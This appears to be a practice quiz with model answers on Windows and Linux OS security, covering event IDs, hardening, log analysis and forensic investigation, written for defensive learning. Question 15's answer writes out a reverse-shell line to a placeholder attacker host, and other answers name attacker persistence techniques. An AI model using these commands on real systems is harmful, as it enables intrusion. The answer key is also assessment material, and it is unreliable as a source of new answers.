# Final Practice Quiz — Session 12: OS Security (Windows and Linux)

**Instructions:** This practice quiz prepares you for the final assessment.
It covers Windows security, Linux security, OS hardening, log analysis, and forensics.
Practice your answers before comparing with model answers.

---

## Part 1: Multiple Choice

**Question 1:** Which Windows Event ID indicates a new process creation?

A) 4624
B) 4625
C) 4688
D) 7045

**Correct Answer: C** — Event ID 4688 logs new process creation. 4624 = successful logon; 4625 = failed logon; 7045 = new service installed.

---

**Question 2:** What registry key would an attacker use to persist a payload that runs every time the current user logs in, without needing administrator privileges?

A) `HKLM\SYSTEM\CurrentControlSet\Services`
B) `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
C) `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
D) `HKLM\SAM\SAM\Domains\Account\Users`

**Correct Answer: B** — HKCU Run keys execute on user logon and can be written without admin rights.
The HKLM variants require admin.

---

**Question 3:** What command in Linux shows all files with the SUID bit set?

A) `ls -l / | grep suid`
B) `find / -perm -4000 -type f`
C) `stat / --suid`
D) `chmod -l suid /`

**Correct Answer: B** — `find / -perm -4000 -type f 2>/dev/null` is the standard command to enumerate all SUID binaries.

---

**Question 4:** Which Windows technique makes credential dumping from LSASS significantly harder by running LSASS as a Protected Process?

A) AppLocker
B) BitLocker
C) RunAsPPL (LSASS Protection)
D) Windows Firewall

**Correct Answer: C** — Setting `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL = 1` enables LSASS as a Protected Process Light, preventing most memory dumping techniques.

---

**Question 5:** An auditd log shows `type=EXECVE a0="wget" a1="-q" a2="http://10.0.0.99/tool" a3="-O" a4="/tmp/.x"`.
What does this indicate?

A) A legitimate system update downloading a patch
B) A user downloading a tool from an internal server to a hidden temp file
C) A kernel module being loaded
D) A network diagnostic command

**Correct Answer: B** — wget downloading to `/tmp/.x` (hidden file) from an arbitrary internal IP is a classic post-exploitation tool download indicator.

---

**Question 6:** Which of the following best describes a "Pass-the-Hash" attack?

A) Brute-forcing a user's password by trying common hashes
B) Using a captured NTLM hash to authenticate without knowing the plaintext password
C) Injecting a malicious hash into the SAM database
D) Intercepting hashed TLS certificates during a man-in-the-middle attack

**Correct Answer: B** — Pass-the-Hash (PtH) uses a captured NTLM hash directly for authentication, bypassing the need to crack the hash to plaintext.

---

**Question 7:** A Linux server's `/etc/sysctl.conf` shows `kernel.randomize_va_space = 0`.
What security risk does this create?

A) Users can read other users' memory
B) It disables ASLR, making memory corruption exploits significantly easier
C) It allows non-root users to load kernel modules
D) It enables IP forwarding, exposing the server as a router

**Correct Answer: B** — ASLR (Address Space Layout Randomization) randomizes memory addresses.
Disabling it (`= 0`) allows attackers to reliably predict the location of code and data in memory, making buffer overflow exploitation much easier.

---

**Question 8:** What does Windows Event ID 1102 in the Security log indicate?

A) A new user account was created
B) The Security audit log was cleared
C) A service failed to start
D) A logon failure occurred

**Correct Answer: B** — Event ID 1102 is generated when the Security audit log is cleared.
This is often an attacker attempting to cover tracks.
(Event ID 104 in the System log covers clearing of other logs.)

---

**Question 9:** In the context of Linux forensics, what can `/proc/<PID>/exe` reveal about a running process?

A) The network connections made by the process
B) The full path of the executable that started the process, even if the file has been deleted from disk
C) The environment variables passed to the process
D) The CPU and memory usage of the process

**Correct Answer: B** — `/proc/<PID>/exe` is a symlink to the executable.
Even after the binary is deleted from disk, the symlink shows the path with `(deleted)` appended, and the binary can still be copied from `/proc/<PID>/exe` for analysis.

---

**Question 10:** Which CIS benchmark control addresses the minimum password length for Windows accounts?

A) CIS 1.1.1
B) CIS 1.1.5
C) CIS 18.3.3
D) CIS 2.3.11.4

**Correct Answer: B** — CIS 1.1.5 sets minimum password length to 14 characters. 18.3.3 = SMBv1; 2.3.11.4 = LSASS Protection.

---

## Part 2: Short Answer Questions

**Question 11:** Explain the difference between Discretionary Access Control (DAC) and Mandatory Access Control (MAC) in Linux.
Give one example of each.

> **Model Answer:** **DAC** (Discretionary Access Control) is the traditional Unix permission model where resource owners control who can access their files via read/write/execute bits. Example: `chmod 640 /etc/myconfig` — the file owner decides access. **MAC** (Mandatory Access Control) overrides DAC with kernel-enforced policy based on security labels, regardless of file permissions. Example: SELinux confines a web server to only access files with the `httpd_content_t` label — even if a file is chmod 777, a confined process cannot access it if the label doesn't match.

---

**Question 12:** Windows Event ID 4688 shows `NewProcessName = cmd.exe`, `ParentProcessName = WINWORD.EXE`.
Why is this suspicious?

> **Model Answer:** Word spawning cmd.exe is suspicious because Word has no legitimate reason to open a command prompt. This is a classic indicator of a malicious macro attack: the user opened a macro-enabled document that executed shell commands. Analysts should alert on any Office application spawning cmd.exe, powershell.exe, wscript.exe, cscript.exe, or mshta.exe. MITRE ATT&CK: T1566.001 (Spear-Phishing Attachment) + T1059.001 (PowerShell) or T1204.002 (Malicious File).

---

**Question 13:** List three registry persistence locations attackers commonly use and explain why each is effective.

> **Model Answer:**
> 1. **`HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`** — Executes at user logon; writable without admin; survives reboots.
> 2. **`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`** — Executes at any user's logon; requires admin (used after escalation); higher privilege.
> 3. **`HKLM\SYSTEM\CurrentControlSet\Services`** — Creates a Windows service running at boot, often as SYSTEM; survives reboots without user login; stealthy.

---

**Question 14:** What is "WDigest" and why is leaving it enabled a security risk?

> **Model Answer:** WDigest is a legacy Windows authentication protocol that keeps plaintext (or easily reversible) credentials in LSASS memory for use with HTTP Digest authentication. When enabled (`UseLogonCredential = 1`), any credential dump from LSASS yields cleartext passwords. It has been disabled by default since Windows 8.1/Server 2012 R2, but attackers can re-enable it post-compromise. Defenders must ensure `HKLM\SYSTEM\...\WDigest\UseLogonCredential = 0` on all systems.

---

**Question 15:** A Linux web server has `/opt/deploy.sh` with permissions `-rwxrwxrwx` (777), and root's crontab runs it every 5 minutes.
What is the attack chain and how would you fix it?

> **Model Answer:** **Attack chain**: Any user (including `www-data` from a compromised web app) can overwrite `/opt/deploy.sh` with a malicious command (e.g., `bash -i >& /dev/tcp/attacker/4444 0>&1`). When root's cron runs the script 5 minutes later, the attacker gets a root shell. This is "world-writable cron script abuse" (T1053.003). **Fix**: `chmod 700 /opt/deploy.sh; chown root:root /opt/deploy.sh`. Additionally, add an auditd rule to alert on writes to files executed by root cron.

---

## Part 3: Long Answer Questions

**Question 16:** You are investigating a Linux server and find: (a) a cron job running as root from `/tmp/.update/sync.sh`, (b) a new user `support` with a bash shell, (c) a Python process whose exe shows as `(deleted)`.
Walk through your investigation and containment steps.

> **Model Answer:**
>
> **Finding A: Cron from /tmp**
> Legitimate applications never run from `/tmp`. This is a planted persistence mechanism. Steps: `cat /tmp/.update/sync.sh` (if still exists); check auditd for when it was created (`ausearch -f /tmp/.update/`); review the cron entry source (`grep -r tmp /etc/cron*`). The name `.update/sync.sh` mimics legitimate-sounding maintenance.
>
> **Finding B: `support` user with bash**
> Service/backdoor accounts shouldn't have interactive shells. Steps: `id support`; `grep support /var/log/auth.log` (check for logins); `ls -la /home/support/.ssh/` (check for backdoor SSH keys); `last support` (login history). Lock immediately: `usermod -L support`.
>
> **Finding C: Deleted binary in /proc**
> Classic anti-forensics: binary deleted after launch to obstruct analysis. Steps: `cat /proc/1234/cmdline | tr '\0' ' '` (original command); `cp /proc/1234/exe /tmp/evidence_binary` (recover binary); `ss -tnp | grep 1234` (network connections); `lsof -p 1234` (open files).
>
> **Containment**: (1) Network isolate; (2) Preserve evidence (memory, logs); (3) Kill malicious process; (4) Remove cron entry; (5) Lock/delete backdoor account; (6) Full IR — system should not return to production until clean.

---

**Question 17:** Compare Windows Event Log and Linux auditd for SOC use.
How would you deploy and correlate both in a hybrid environment?

> **Model Answer:**
>
> **Windows Event Log strengths**: Structured XML, AD context (SIDs, group memberships), rich built-in event catalog (4624/4625/4688/7045 etc.), native WEF for centralized forwarding, broad SIEM vendor support. Weaknesses: Many valuable events disabled by default (4688 needs process creation auditing enabled; 4657 for registry needs object access auditing).
>
> **Linux auditd strengths**: Kernel-level — cannot be bypassed by user-space tools; extremely flexible rules (any syscall, file, network operation); authoritative for privilege use and file access. Weaknesses: No built-in event catalog; requires explicit rule writing; less structured format; requires separate centralization.
>
> **Hybrid strategy**: (1) Centralize both to SIEM — Windows via WEF+Winlogbeat, Linux via Filebeat/rsyslog; (2) Normalize field names in SIEM; (3) Cross-platform detection rules (e.g., brute-force correlation across Windows 4625 and Linux SSH failures); (4) Enable Sysmon on Windows for richer process/network logs; (5) Deploy comprehensive auditd ruleset on Linux; (6) Alert on log silence (attacker may clear logs or stop agents).

---

**Question 18:** A security engineer proposes: "We'll keep mkumar's SSH access active for 2 weeks after his resignation as a grace period in case there are outstanding issues." What are the risks and what should the correct offboarding process be?

> **Model Answer:**
>
> **Risks**: (a) Any active SSH access is a potential backdoor — even a trusted employee may exfiltrate data during a grace period; (b) The employee may resent termination and deliberately misuse access; (c) Compromised credentials (password reuse on external sites) during the grace period could allow unauthorized re-entry; (d) Grace periods create audit/compliance problems (PCI-DSS R8 requires revocation upon termination).
>
> **Correct process**: (1) Revoke all SSH authorized_keys from ALL systems at or before last day — not just AD/LDAP account lock; (2) Disable/delete local accounts on Linux servers; (3) Rotate all CI/CD deploy keys, shared service account credentials, and any secrets the employee had access to; (4) Conduct access audit to document what the user had access to; (5) Archive keys/credentials don't just delete — retain for audit purposes; (6) Monitor for any attempts to access systems post-revocation and alert on any login from the user's previous IP ranges.

---

**Question 19 (Scenario):** During a DFIR engagement you find these two entries in `/root/.ssh/authorized_keys`:

```text
ssh-rsa AAAAB3NzaC1yc2EAAAA...legitimate-key sysadmin@corp-jump
ssh-rsa AAAAB3NzaC1yc2EAAAA...backdoor-key attacker@kali
```

The file's `mtime` shows it was last modified 6 months ago, but `ctime` shows yesterday.
What does this tell you, and how would you investigate?

> **Model Answer:**
>
> `mtime` (content modification time) showing 6 months ago but `ctime` (inode/metadata change time) showing yesterday is a **timestomping indicator** (T1070.006). An attacker added their key yesterday and then used `touch -t` or similar to backdate the `mtime` to appear as a pre-existing legitimate key. `ctime` cannot be manipulated through normal filesystem operations — it updates whenever the inode metadata changes (including `mtime` manipulation itself).
>
> **Investigation steps**: (1) `stat /root/.ssh/authorized_keys` — document all three timestamps; (2) Search auth.log for logins using this key pattern: `grep "SHA256:" /var/log/auth.log` — the key fingerprint appears on authentication; (3) Check auditd for when the file was written: `ausearch -f /root/.ssh/authorized_keys`; (4) Identify who performed the modification (which UID/process wrote it); (5) Check `known_hosts` on the attacker's machine — the server's host key will be in their known_hosts from first connection. The key comment `attacker@kali` is a direct attribution indicator.
